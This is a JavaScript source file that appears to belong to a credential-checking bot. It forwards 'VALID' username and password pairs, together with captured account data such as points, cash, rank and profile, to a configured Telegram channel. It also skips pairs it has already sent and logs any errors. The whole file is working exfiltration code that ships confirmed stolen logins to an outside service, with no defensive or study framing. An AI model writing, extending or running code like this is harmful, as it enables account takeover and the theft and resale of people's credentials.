/**
 * =============================================================================
 * CHANNEL FORWARDER - Forward VALID credentials to Telegram channel
 * =============================================================================
 * 
 * Sends VALID credentials (with capture data) to a configured Telegram channel.
 * Ensures each credential is only forwarded once via channelForwardStore.
 * 
 * Requires FORWARD_CHANNEL_ID environment variable to be set.
 * 
 * =============================================================================
 */

const { hasBeenForwarded, markForwarded } = require('./channelForwardStore');
const { buildChannelForwardMessage } = require('./messages');
const { createLogger } = require('../logger');

const log = createLogger('channel-forwarder');

/**
 * Get the channel ID from environment.
 * @returns {string|null} Channel ID or null if not configured
 */
function getChannelId() {
  const channelId = process.env.FORWARD_CHANNEL_ID;
  if (!channelId || !channelId.trim()) {
    return null;
  }
  return channelId.trim();
}

/**
 * Check if channel forwarding is enabled.
 * @returns {boolean} True if FORWARD_CHANNEL_ID is configured
 */
function isForwardingEnabled() {
  return getChannelId() !== null;
}

/**
 * Forward a VALID credential to the configured channel.
 * 
 * @param {Object} telegram - Telegraf telegram instance (ctx.telegram)
 * @param {string} username - Email/username
 * @param {string} password - Password
 * @param {Object} [capture] - Capture data (points, rank, cash, profile, etc.)
 * @returns {Promise<boolean>} True if forwarded, false if skipped or failed
 */
async function forwardValidToChannel(telegram, username, password, capture = {}) {
  const channelId = getChannelId();
  
  // Skip if channel not configured
  if (!channelId) {
    log.debug('Channel forwarding not configured (FORWARD_CHANNEL_ID not set)');
    return false;
  }
  
  try {
    // Check if already forwarded (dedupe)
    const alreadyForwarded = await hasBeenForwarded(username, password);
    if (alreadyForwarded) {
      log.debug(`Already forwarded: ${username.slice(0, 5)}***`);
      return false;
    }
    
    // Build the message
    const message = buildChannelForwardMessage({ username, password, capture });
    
    // Send to channel
    await telegram.sendMessage(channelId, message, {
      parse_mode: 'MarkdownV2',
      disable_web_page_preview: true,
    });
    
    // Mark as forwarded
    await markForwarded(username, password);
    
    log.info(`Forwarded to channel: ${username.slice(0, 5)}***`);
    return true;
    
  } catch (err) {
    // Log error but don't throw - channel forwarding should not break main flow
    log.error(`Channel forward failed: ${err.message}`);
    
    // Common error handling
    if (err.message.includes('chat not found')) {
      log.error('Channel not found. Check FORWARD_CHANNEL_ID is correct and bot is added to channel.');
    } else if (err.message.includes('not enough rights')) {
      log.error('Bot does not have permission to post in channel. Make bot an admin.');
    }
    
    return false;
  }
}

module.exports = {
  forwardValidToChannel,
  isForwardingEnabled,
  getChannelId,
};
